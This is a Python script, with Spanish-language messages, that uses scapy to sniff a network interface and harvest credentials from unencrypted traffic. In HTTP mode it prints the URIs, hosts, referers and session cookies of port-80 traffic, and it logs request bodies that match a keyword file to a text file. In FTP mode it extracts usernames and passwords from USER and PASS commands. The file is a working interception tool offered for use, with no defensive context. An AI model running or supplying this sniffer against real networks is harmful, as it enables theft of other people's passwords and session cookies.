from colors_data import *
from scapy.all import *
import argparse
import re as sc
import signal
import os

def ctrl_c_trap(sig, frame):
    print("[!] Saliendo...")
    exit(1)

signal.signal(signal.SIGINT, ctrl_c_trap)

class MainDateSniif:
    def __init__(self, interface, method, archivo) -> None:
        self.IN_FACE_S = interface
        self.SN_METHOD = method
        self.ARCHIVE = archivo
        self.VERIFY = False

    def create_log_http(self, file, escrite):
        with open(file, 'a') as archivo:
            archivo.write(escrite)

    def show_tracket_http(self, face_http):
        if face_http.haslayer(TCP) and face_http.haslayer(Raw):
            if face_http[TCP].dport == 80 or face_http[TCP].sport == 80:
                str_payload = face_http[TCP].payload.load.decode("utf-8",errors="ignore")
                destino_ip = face_http.getlayer(IP).dst
                send_ip = face_http.getlayer(IP).src
                data_load = str_payload.strip().split('\n')
                data_http = sc.search(r"(GET|POST) (.*?) HTTP", str_payload)
                host = sc.search(r"Host: (.*?)\r\n", str_payload)
                referer = sc.search(r"Referer: (.*?)\r\n", str_payload)
                cookie = sc.search(r"Cookie: (.*?)\r\n", str_payload)
                if data_http:
                    print(f"\n{VERDE}[!] {ROJO}PAQUETES HTTP CAPTURADOS.\n{WHITE}[{send_ip}] -> [{destino_ip}]\n{VERDE}[+] URI: {YELLOW}{data_http.group(2)}")
                if host:
                    print(f"{VERDE}[+] HOST: {YELLOW}{host.group(1)}")
                if referer:
                    print(f"{VERDE}[+] REFERER: {YELLOW}{referer.group(1)}")
                if cookie:
                    print(f"{VERDE}[+] Cookie: {YELLOW}{cookie.group(1)}")
                if data_load:
                    try:
                        load_env = self.stringif_data()
                        for clave in load_env:
                            if clave.strip() in data_load[-1]:
                                if not self.VERIFY:
                                    print(f"{VERDE}[+] DATA: {AZUL}{data_load[-1]}")
                                    self.VERIFY = True
                                    if self.ARCHIVE is not None:
                                        buffer = self.ARCHIVE + ".txt"
                                        self.create_log_http(buffer,f"[+] REFERER: {referer.group(1)}\n[*] DATA: {data_load[-1]}\n")
                                    else:
                                        pass
                            else: pass
                    except Exception as e:
                       print(str(e))

               
    def stringif_data(self):
        if not os.path.exists('scripts_py/Sniif/camps1.txt'): print(f"{YELLOW}[!] {ROJO}EL ARCHIVO DE LAS CLAVES NO EXISTE."), exit(1)
        try:
            with open('scripts_py/Sniif/camps1.txt') as line:
                return line.readlines()
        except:
            print(f"{YELLOW}[!] {ROJO}ARCHIVO CLAVE CORROMPIDO.")

    def show_tracket_ftp(self, int_face):
        if int_face[TCP].dport == 21:
            data_show = int_face.sprintf("%Raw.load%")
            destino_ip = int_face.getlayer(IP).dst
            send_ip = int_face.getlayer(IP).src
            user = sc.findall("(?i)USER (.*)", data_show)
            pass_user = sc.findall("(?i)PASS (.*)", data_show) 
            if user:
                print("\n[!] - CONEXIÓN FTP CAPTURADA\n")
                print(f"[+] PAQUETE FTP: {send_ip} -> {destino_ip}\n[+] USER: {user[0][:-5]}")
            elif pass_user:
                print(f"[+] PASSWORD: {pass_user[0][:-5]}") #\\r\\n'
            else:
                pass

    def tracket_interface(self):
        if self.SN_METHOD.lower() in ("ftp", "lftp", "uftp"):
            print(f"{YELLOW}[!] {YELLOW}- {ROJO}ESCUCHANDO EN LA INTERFAZ {self.IN_FACE_S}")
            sniff(iface=self.IN_FACE_S, prn=self.show_tracket_ftp, filter="tcp and port 21")
        elif self.SN_METHOD.lower() in ("http", "lhttp", "uhttp"):
            print(f"{YELLOW}[!] {YELLOW}- {ROJO}ESCUCHANDO EN LA INTERFAZ {YELLOW}{self.IN_FACE_S}")
            sniff(iface=self.IN_FACE_S, prn=self.show_tracket_http, filter="tcp port 80")
        else:
            print(f"{VERDEL}[!] {MG}- {ROJO}EL OLFATEADOR INGRESADO NO EXISTE")


class MainCatalystCommands:
    def __init__(self) -> None:
        self.DIS_INTERFACE = ['wlan0', 'lo', 'eth0', 'Ethernet 3', 'Wi-Fi']

    def arg_monument(self):
        parser = argparse.ArgumentParser()
        parser.add_argument("-i", "--interface", type=str, help="Agrega una interfaz donde quieres que se capturen los paquetes.", required=True)
        parser.add_argument("-s", "--sniff", help="Metodo para capturar paquetes -> [HTTP]-[FTP]", required=True)
        parser.add_argument("-a", "--archive", default=None)
        arg_catalyst = parser.parse_args()
        if not arg_catalyst.interface:
            print("[!] - Usted no ingreso una interface -> -i <interface>")
            exit()
        if arg_catalyst.archive is not None:
            archivo = arg_catalyst.archive
        else:
            archivo = None
        try:
            if arg_catalyst.interface in self.DIS_INTERFACE:
                send_interface = MainDateSniif(arg_catalyst.interface, arg_catalyst.sniff, archivo)
                send_interface.tracket_interface()
            else:
                print(f"{VERDEL}[!] {YELLOW}- {ROJO}LA INTERFAZ INGRESADA NO ES SOPORTADA :(")
        except OSError:
            print(f"{ROJO}[!] {MG}- {YELLOW}ERROR DEVICE {MG}-> {ROJO}{arg_catalyst.interface} {YELLOW}NO EXISTE EN TU SISTEMA")
        except AttributeError:
            print(f"{VERDEL}[!] {ROJO}FALLO EN EL ARGUMENTO sniff {MG}-> {ROJO}-s=<method>")
       

MainCatalystCommands().arg_monument()